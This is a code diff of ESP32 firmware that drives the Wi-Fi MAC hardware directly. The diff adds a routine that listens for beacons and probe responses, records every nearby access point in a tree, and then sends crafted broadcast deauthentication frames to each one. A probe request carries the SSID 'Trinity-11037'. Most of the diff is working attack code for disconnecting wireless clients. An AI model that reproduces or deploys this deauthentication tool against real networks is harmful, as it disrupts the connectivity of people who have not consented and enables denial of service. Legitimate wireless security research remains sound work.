@@ -25,7 +25,7 @@
 
 #define RX_BUFFER_AMOUNT 10
 #define RX_RESOURCE_SEMAPHORE 10
-#define MAX_RECEIVED_PACKETS 7 
+#define MAX_RECEIVED_PACKETS 10
 
 #define TX_BUFFER_AMOUNT 10 
 #define TX_RESOURCE_SEMAPHORE 10
@@ -185,8 +185,8 @@ extern uint8_t deauth_packet_2[];
 
 uint8_t custom_deauth_packet[] = {
     0x1e, 0x0, 0xf, 0x0, 
-    0x0, 0x0, 0x0, 0x0,
-    0xc0, 0x0, /*duration*/ 0xff, 0xff, // The duration is unfortunately reset by the hardware,
+    0xff, 0xff, 0xff, 0xff,
+    0xc0, 0x08, /*duration*/ 0x3a, 0x01, // The duration is unfortunately reset by the hardware,
 										// in facts in wireshark it is 0x0000
     0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Destination
     0x40, 0x4c, 0xca, 0x51, 0x57, 0xd8, // Source
@@ -197,16 +197,16 @@ uint8_t custom_deauth_packet[] = {
 
 unsigned char custom_probe_request_packet[] = 
 {
-	0x8b, 0x0, 0xf, 0x0, 
+	0x9c, 0x0, 0xf, 0x0, 
 	0x0, 0x0, 0x0, 0x0,
-	0x40, 0x0, 0x0, 0x0, 
+	0x40, 0x0, 0x3a, 0x01, 
 	0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 
 	0x40, 0x4c, 0xca, 0x51, 0x57, 0xd8,
 	0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 
 	0x90, 0x7e, 
 	// 32 bytes above
 	// Tagged parameters
-	0x0, 0x0, // Empty SSID
+	0x0, 0xd, 'T', 'r', 'i', 'n', 'i', 't', 'y', '-', '1', '1', '0', '3', '7',// Empty SSID
 	0x1, 0x4, 0x2, 0x4, 0xb, 0x16, 
 	0x32, 0x8, 0xc, 0x12, 0x18, 0x24, 
 	0x30, 0x48, 0x60, 0x6c, 
@@ -220,7 +220,8 @@ unsigned char custom_probe_request_packet[] =
 	0x21, 0x0, 0x7f, 0xa, 0x0, 0x0, 0xa, 0x82, 0x0, 0x40, 0x0, 0x0, 
 	0x0, 0x1, 0xff, 0x3, 0x2, 0x0, 0x44, 0xdd, 0xa, 0x50, 0x6f, 0x9a, 
 	0x16, 0x3, 0x1, 0x3, 0x65, 0x1, 0x1, 0xdd, 0x8, 0x8c, 0xfd, 0xf0, 
-	0x1, 0x1, 0x2, 0x1, 0x0, 0x60, 0x1c, 0x40, 0xef
+	0x1, 0x1, 0x2, 0x1, 0x0, 0x60, 0x1c, 0x40, 0xef,
+	0xef, 0xbe, 0xad, 0xde
 };
 
 TreeNode *network = NULL;
@@ -322,11 +323,11 @@ void IRAM_ATTR wifi_interrupt_handler(void* args)
 {
 	interrupt_count++;
 	// Print the interrupt count
-	ESP_LOGD(TAG, "Interrupt count: %d", interrupt_count);
+	// ESP_LOGD(TAG, "Interrupt count: %d", interrupt_count);
 
 	uint32_t cause = read_register(WIFI_DMA_INT_STATUS);
 	// Print the cause of the interrupt
-	ESP_LOGD(TAG, "Interrupt cause: %08x", (int)cause);
+	// ESP_LOGD(TAG, "Interrupt cause: %08x", (int)cause);
 	if (cause == 0)
 	{
 		return;
@@ -335,21 +336,21 @@ void IRAM_ATTR wifi_interrupt_handler(void* args)
 
 	if (cause & 0x800)
 	{
-		ESP_LOGW(TAG, "panic watchdog()");
+		// ESP_LOGW(TAG, "panic watchdog()");
 	}
 	volatile bool tmp = false;
-	// if (xSemaphoreTakeFromISR(rx_queue_resources, &tmp))
-	// {
-	hardware_queue_entry_t queue_entry;
-	queue_entry.type = RX_ENTRY;
-	queue_entry.content.rx.interrupt_received = cause;
-	bool higher_prio_task_woken = false;
-	xQueueSendFromISR(hardware_event_queue, &queue_entry, &higher_prio_task_woken);
-	if (higher_prio_task_woken)
+	if (xSemaphoreTakeFromISR(rx_queue_resources, &tmp))
 	{
-		portYIELD_FROM_ISR();
-	}
-	// }	
+		hardware_queue_entry_t queue_entry;
+		queue_entry.type = RX_ENTRY;
+		queue_entry.content.rx.interrupt_received = cause;
+		bool higher_prio_task_woken = false;
+		xQueueSendFromISR(hardware_event_queue, &queue_entry, &higher_prio_task_woken);
+		if (higher_prio_task_woken)
+		{
+			portYIELD_FROM_ISR();
+		}
+	}	
 }
 
 // If I get to overwrite &s_intr_handlers+0x8 to point to wifi_interrupt_handler
@@ -470,12 +471,12 @@ void setup_rx_chain()
 
 void update_rx_chain()
 {
-	ESP_LOGI(TAG, "Calling update_rx_chain");
-	ESP_LOGI(TAG, "WIFI_MAC_INITMASK = 0x%08lx", read_register(WIFI_MAC_INITMASK));
-	ESP_LOGI(TAG, "WIFI_MAC_BITMASK = 0x%08lx", read_register(WIFI_MAC_BITMASK));
-	ESP_LOGI(TAG, "WIFI_BASE_RX_DSCR = 0x%08lx", read_register(WIFI_BASE_RX_DSCR));
-	ESP_LOGI(TAG, "WIFI_NEXT_RX_DSCR = 0x%08lx", read_register(WIFI_NEXT_RX_DSCR));
-	ESP_LOGI(TAG, "WIFI_LAST_RX_DSCR = 0x%08lx", read_register(WIFI_LAST_RX_DSCR));	
+	// ESP_LOGI(TAG, "Calling update_rx_chain");
+	// ESP_LOGI(TAG, "WIFI_MAC_INITMASK = 0x%08lx", read_register(WIFI_MAC_INITMASK));
+	// ESP_LOGI(TAG, "WIFI_MAC_BITMASK = 0x%08lx", read_register(WIFI_MAC_BITMASK));
+	// ESP_LOGI(TAG, "WIFI_BASE_RX_DSCR = 0x%08lx", read_register(WIFI_BASE_RX_DSCR));
+	// ESP_LOGI(TAG, "WIFI_NEXT_RX_DSCR = 0x%08lx", read_register(WIFI_NEXT_RX_DSCR));
+	// ESP_LOGI(TAG, "WIFI_LAST_RX_DSCR = 0x%08lx", read_register(WIFI_LAST_RX_DSCR));	
 	write_register(WIFI_MAC_BITMASK, read_register(WIFI_MAC_BITMASK) | 0x1);
 	// Wait for confirmation from hardware
 	while (read_register(WIFI_MAC_BITMASK) & 0x1);
@@ -487,11 +488,16 @@ void on_receive(wifi_promiscuous_pkt_t *packet)
     // ESP_LOGI(TAG, "Calling open_mac_rx_callback");
     mac80211_frame *p = (mac80211_frame *)packet->payload;
 
-	// // If the packet is not a beacon, probe request or probe response, discard it
-	// if (p->frame_control.type != 0 || (p->frame_control.sub_type != 8 && p->frame_control.sub_type != 4 && p->frame_control.sub_type != 5))
-	// {
-	// 	return;
-	// }
+	// ESP_LOG_BUFFER_HEXDUMP("packet-content from open_mac_rx_callback", packet->payload, 100, ESP_LOG_INFO);
+
+
+	// If the packet is not a beacon, probe request or probe response, discard it
+	if (p->frame_control.type != 0 || (p->frame_control.sub_type != 8 && p->frame_control.sub_type != 4 && p->frame_control.sub_type != 5))
+	{
+		return;
+	}
+
+	treat_mac80211_frame(p);
 
 	// if (*(uint8_t *)((uint8_t *)packet->payload) != 0x40)
 	// {
@@ -506,24 +512,25 @@ void on_receive(wifi_promiscuous_pkt_t *packet)
     // }
     // ESP_LOGI(TAG, "Accepted: from "MACSTR" to "MACSTR" type=%d, subtype=%d from_ds=%d to_ds=%d",MAC2STR(p->transmitter_address), MAC2STR(p->receiver_address), p->frame_control.type, p->frame_control.sub_type, p->frame_control.from_ds, p->frame_control.to_ds);  
 
-    if(!packet_reception_queue) 
-    {
-        ESP_LOGI(TAG, "Received, but queue does not exist yet");
-        return;
-    }
+    // if(!packet_reception_queue) 
+    // {
+    //     ESP_LOGI(TAG, "Received, but queue does not exist yet");
+    //     return;
+    // }
 
     // wifi_promiscuous_pkt_t *packet_queue_copy = malloc(packet->rx_ctrl.sig_len + 28 - 4);
-	mac80211_frame *packet_queue_copy = malloc(1600);
-    memcpy(packet_queue_copy, packet->payload, 1600);
+	// mac80211_frame *packet_queue_copy = malloc(1600);
+    // memcpy(packet_queue_copy, packet->payload, 1600);
     // ESP_LOGW(TAG, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");
-    ESP_LOG_BUFFER_HEXDUMP("packet-content from open_mac_rx_callback", packet->payload, 100, ESP_LOG_INFO);
+    // ESP_LOG_BUFFER_HEXDUMP("packet-content from open_mac_rx_callback", packet->payload, 100, ESP_LOG_INFO);
 	// ESP_LOG_BUFFER_HEXDUMP("mac80211-content from open_mac_rx_callback", packet->payload, 100, ESP_LOG_INFO);
     // ESP_LOGW(TAG, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");
-    if (!(xQueueSendToBack(packet_reception_queue, &packet_queue_copy, 0)))
-    {
-        ESP_LOGW(TAG, "MAC RX queue full!");
-		free(packet_queue_copy);
-    }
+
+    // if (!(xQueueSendToBack(packet_reception_queue, &packet_queue_copy, 0)))
+    // {
+    //     ESP_LOGW(TAG, "MAC RX queue full!");
+	// 	free(packet_queue_copy);
+    // }
     // else
     // {
     //     ESP_LOGI(TAG, "MAC RX queue entry added");
@@ -532,18 +539,18 @@ void on_receive(wifi_promiscuous_pkt_t *packet)
 
 void handle_rx_messages(rx_callback rxcb)
 {
-	ESP_LOGI(TAG, "Calling handle_rx_messages");
-	ESP_LOGI(TAG, "WIFI_MAC_INITMASK = 0x%08lx", read_register(WIFI_MAC_INITMASK));
-	ESP_LOGI(TAG, "WIFI_MAC_BITMASK = 0x%08lx", read_register(WIFI_MAC_BITMASK));
-	ESP_LOGI(TAG, "WIFI_BASE_RX_DSCR = 0x%08lx", read_register(WIFI_BASE_RX_DSCR));
-	ESP_LOGI(TAG, "WIFI_NEXT_RX_DSCR = 0x%08lx", read_register(WIFI_NEXT_RX_DSCR));
-	ESP_LOGI(TAG, "WIFI_LAST_RX_DSCR = 0x%08lx", read_register(WIFI_LAST_RX_DSCR));	
+	// ESP_LOGI(TAG, "Calling handle_rx_messages");
+	// ESP_LOGI(TAG, "WIFI_MAC_INITMASK = 0x%08lx", read_register(WIFI_MAC_INITMASK));
+	// ESP_LOGI(TAG, "WIFI_MAC_BITMASK = 0x%08lx", read_register(WIFI_MAC_BITMASK));
+	// ESP_LOGI(TAG, "WIFI_BASE_RX_DSCR = 0x%08lx", read_register(WIFI_BASE_RX_DSCR));
+	// ESP_LOGI(TAG, "WIFI_NEXT_RX_DSCR = 0x%08lx", read_register(WIFI_NEXT_RX_DSCR));
+	// ESP_LOGI(TAG, "WIFI_LAST_RX_DSCR = 0x%08lx", read_register(WIFI_LAST_RX_DSCR));	
 
-	ESP_LOGI(TAG, "printing the chain");
-	print_rx_chain(rx_chain_begin);
+	// ESP_LOGI(TAG, "printing the chain");
+	// print_rx_chain(rx_chain_begin);
 
 	dma_list_item *current = rx_chain_begin;
-	ESP_LOGI(TAG, "current ptr = %p", current);
+	// ESP_LOGI(TAG, "current ptr = %p", current);
 	int received = 0;
 	while(current)
 	{
@@ -552,56 +559,56 @@ void handle_rx_messages(rx_callback rxcb)
 		{
 			received++;
 
-			ESP_LOGI(TAG, "current->has_data = 1");
+			// ESP_LOGI(TAG, "current->has_data = 1");
 			wifi_promiscuous_pkt_t *packet = current->packet;
 
-			ESP_LOGI(TAG, "Calling rxcb");
+			// ESP_LOGI(TAG, "Calling rxcb");
 			rxcb(packet);
 
 			rx_chain_begin = current->next;
-			ESP_LOGI(TAG, "rx_chain_begin = current->next = %p", rx_chain_begin);
+			// ESP_LOGI(TAG, "rx_chain_begin = current->next = %p", rx_chain_begin);
 			current->next = NULL;
 			current->has_data = 0;
 
 			// Put the DMA buffer back in the linked list
 			if(rx_chain_begin)
 			{
-				ESP_LOGI(TAG, "rx_chain_begin is not NULL");
-				ESP_LOGI(TAG, "rx_chain_last = %p", rx_chain_last);
+				// ESP_LOGI(TAG, "rx_chain_begin is not NULL");
+				// ESP_LOGI(TAG, "rx_chain_last = %p", rx_chain_last);
 				rx_chain_last->next = current;
-				ESP_LOGI(TAG, "rx_chain_last->next = current = %p", current);
+				// ESP_LOGI(TAG, "rx_chain_last->next = current = %p", current);
 				update_rx_chain();
 				if(read_register(WIFI_NEXT_RX_DSCR) == 0x3ff00000)
 				{
-					ESP_LOGI(TAG, "read_register(WIFI_NEXT_RX_DSCR) == 0x3ff00000 -> 0x%08lx", read_register(WIFI_NEXT_RX_DSCR));
+					// ESP_LOGI(TAG, "read_register(WIFI_NEXT_RX_DSCR) == 0x3ff00000 -> 0x%08lx", read_register(WIFI_NEXT_RX_DSCR));
 					dma_list_item *last_dscr = (dma_list_item *)read_register(WIFI_LAST_RX_DSCR);
 					if (current == last_dscr)
 					{
-						ESP_LOGI(TAG, "current == last_dscr");
+						// ESP_LOGI(TAG, "current == last_dscr");
 						rx_chain_last = current;
 					}
 					else
 					{
-						ESP_LOGI(TAG, "current != last_dscr");
+						// ESP_LOGI(TAG, "current != last_dscr");
 						set_rx_base_address(last_dscr->next);
 						rx_chain_last = current;
 					}
 				}
 				else
 				{
-					ESP_LOGI(TAG, "read_register(WIFI_NEXT_RX_DSCR) != 0x3ff00000 -> 0x%08lx", read_register(WIFI_NEXT_RX_DSCR));
+					// ESP_LOGI(TAG, "read_register(WIFI_NEXT_RX_DSCR) != 0x3ff00000 -> 0x%08lx", read_register(WIFI_NEXT_RX_DSCR));
 					rx_chain_last = current;
 				}
 			}
 			else
 			{
-				ESP_LOGI(TAG, "rx_chain_begin is NULL");
+				// ESP_LOGI(TAG, "rx_chain_begin is NULL");
 				rx_chain_begin = current;
 				set_rx_base_address(current);
 				rx_chain_last = current;
 			}
 		}
-		ESP_LOGI(TAG, "current->has_data = 0");
+		// ESP_LOGI(TAG, "current->has_data = 0");
 		current = next;
 		if(received > MAX_RECEIVED_PACKETS)
 		{
@@ -657,12 +664,12 @@ void send_deauth_from_to(const void *data)
 	memcpy(custom_deauth_packet + 18, ap_mac, 6);
 	memcpy(custom_deauth_packet + 24, ap_mac, 6);
 	// Send the packet
-	transmit_one(custom_deauth_packet, 0, 20);
+	transmit_one(custom_deauth_packet, 0, 1);
+
 }
 
 void listen_to(int seconds)
 {
-	// Listen for 10 seconds and transmit again
 	uint64_t start_time = esp_timer_get_time();
 	while(true)
 	{
@@ -703,7 +710,7 @@ void listen_to(int seconds)
 				{
 					ESP_LOGW(TAG, "lmacProcessCollisions");
 				}
-				// xSemaphoreGive(rx_queue_resources);
+				xSemaphoreGive(rx_queue_resources);
 			}
 			// else if (queue_entry.type == TX_ENTRY)
 			// {
@@ -850,7 +857,7 @@ void wifi_hardware_task(hardware_mac_args *pvParameter)
 		// ESP_LOGI(TAG, "Switching to frequency 0x%08x", next_frequency);
 		// // Set the frequency
 		// switch_channel(next_frequency, 0);
-		vTaskDelay(200 / portTICK_PERIOD_MS);
+		vTaskDelay(4*1000 / portTICK_PERIOD_MS);
 
 		// // Transmit 5 packets
 		// for (int i = 0; i < 5; i++) 
@@ -867,18 +874,8 @@ void wifi_hardware_task(hardware_mac_args *pvParameter)
 		ESP_LOGI(TAG, "================================");
 		ESP_LOGI(TAG, "Sending and receiving probes");
 		ESP_LOGI(TAG, "================================");
-		send_and_receive_probes(next_index+1, 5);
+		send_and_receive_probes(next_index+1, 2);
 		++counter;
-		// send_and_receive_probes(2, 5);
-		// send_and_receive_probes(3, 5);
-		// send_and_receive_probes(4, 5);
-		// send_and_receive_probes(5, 5);
-		// send_and_receive_probes(6, 5);
-		// send_and_receive_probes(7, 5);
-		// send_and_receive_probes(8, 5);
-		// send_and_receive_probes(9, 5);
-		// send_and_receive_probes(10, 5);
-		// send_and_receive_probes(11, 5);
 	}
 }
 
@@ -900,6 +897,52 @@ uint8_t find_channel(uint8_t *fixed_and_tagged_parameters)
 	assert(tagged_parameters[1] == 1);
 	ESP_LOGI(TAG, "Channel found: %d", tagged_parameters[2]);
 	return tagged_parameters[2];
+}
+
+
+void treat_mac80211_frame(mac80211_frame *p)
+{
+
+	// If the packet is a beacon, then we add the AP to the network
+	if(p->frame_control.type == 0 && p->frame_control.sub_type == 8)
+	{
+		// ESP_LOGI(TAG, " --> Beacon packet");
+		// ESP_LOG_BUFFER_HEXDUMP("Beacon packet", p, 200, ESP_LOG_INFO);		
+		uint8_t *bssid = p->transmitter_address;
+		MACAddress ap;
+		memcpy(ap.mac, bssid, 6);
+		ap.channel = find_channel(p->data_and_fcs);
+
+		insert_node(&network, &ap, sizeof(MACAddress), NULL, compare_mac_addresses);
+	}
+
+	// If the packet is a probe response 
+	if(p->frame_control.type == 0 && p->frame_control.sub_type == 5)
+	{
+		// ESP_LOGI(TAG, " --> Probe response packet");
+		// ESP_LOG_BUFFER_HEXDUMP("Probe response packet", p, 200, ESP_LOG_INFO);
+
+		// Check that the probe response is directed to us
+		uint8_t mac[6] = MY_MAC_ADDRESS;
+
+		if(memcmp(p->receiver_address, mac, 6) == 0)
+		{
+			// ESP_LOGI(TAG, "   -- > Probe response directed to us");
+			// Skip the first 10 bytes and copy the 6 bytes of the BSSID
+			uint8_t *bssid = p->transmitter_address;
+			MACAddress ap = {
+				.mac = {bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]}
+			};
+			insert_node(&network, &ap, sizeof(MACAddress), NULL, compare_mac_addresses);
+		}
+	}
+
+	ESP_LOGI(TAG, "Network:");
+	process_tree(network, print_couple_ap_sta);
+
+	ESP_LOGI(TAG, "Sending deauth packets");
+	process_tree(network, send_deauth_from_to);	
+
 }
 
 void reading_task(void)
@@ -925,45 +968,7 @@ void reading_task(void)
 
             ESP_LOG_BUFFER_HEXDUMP("packet-content from reading_task", p, 100, ESP_LOG_INFO);
 
-			// If the packet is a beacon, then we add the AP to the network
-			if(p->frame_control.type == 0 && p->frame_control.sub_type == 8)
-			{
-				ESP_LOGI(TAG, " --> Beacon packet");
-				ESP_LOG_BUFFER_HEXDUMP("Beacon packet", p, 200, ESP_LOG_INFO);		
-				uint8_t *bssid = p->transmitter_address;
-				MACAddress ap;
-				memcpy(ap.mac, bssid, 6);
-				ap.channel = find_channel(p->data_and_fcs);
-
-				insert_node(&network, &ap, sizeof(MACAddress), NULL, compare_mac_addresses);
-			}
-
-			// If the packet is a probe response 
-			if(p->frame_control.type == 0 && p->frame_control.sub_type == 5)
-			{
-				ESP_LOGI(TAG, " --> Probe response packet");
-				ESP_LOG_BUFFER_HEXDUMP("Probe response packet", p, 200, ESP_LOG_INFO);
-
-				// Check that the probe response is directed to us
-				uint8_t mac[6] = MY_MAC_ADDRESS;
-
-				if(memcmp(p->receiver_address, mac, 6) == 0)
-				{
-					ESP_LOGI(TAG, "   -- > Probe response directed to us");
-					// Skip the first 10 bytes and copy the 6 bytes of the BSSID
-					uint8_t *bssid = p->transmitter_address;
-					MACAddress ap = {
-						.mac = {bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]}
-					};
-					insert_node(&network, &ap, sizeof(MACAddress), NULL, compare_mac_addresses);
-				}
-			}
-
-			ESP_LOGI(TAG, "Network:");
-			process_tree(network, print_couple_ap_sta);
-
-			ESP_LOGI(TAG, "Sending deauth packets");
-			process_tree(network, send_deauth_from_to);
+			treat_mac80211_frame(p);
             free(p);
         }
         else
